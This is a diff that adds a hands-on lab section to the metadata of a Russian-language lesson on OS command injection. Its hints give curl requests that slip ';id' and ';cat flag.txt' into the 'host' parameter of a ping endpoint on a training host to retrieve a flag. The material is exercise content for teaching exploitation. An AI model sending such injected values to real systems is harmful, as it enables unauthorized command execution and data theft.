@@ -12,6 +12,18 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 38
 summary: "Как найти и проэксплуатировать инъекцию команд ОС: разделители, blind-техники, обход фильтров и получение RCE."
+lab:
+  kind: shell
+  title: "Практика: инъекция команд ОС"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Базовый запрос: `curl -s 'http://shop.lab.local/ping?host=127.0.0.1'` — сервер пингует хост.
+    - Добавь разделитель: `;` (в URL закодируй). Удобно так: `curl -s -G http://shop.lab.local/ping --data-urlencode 'host=127.0.0.1;id'`.
+    - Ты выполнил `id` — значит есть RCE. Прочитай файл: `--data-urlencode 'host=127.0.0.1;cat flag.txt'`.
+    - Флаг — в рабочем каталоге приложения, файл `flag.txt`. Достань последнюю строку: `curl -s -G http://shop.lab.local/ping --data-urlencode 'host=127.0.0.1;cat flag.txt' | tail -1 > found.txt`, затем `check`.
 ---
 
 ## Задача
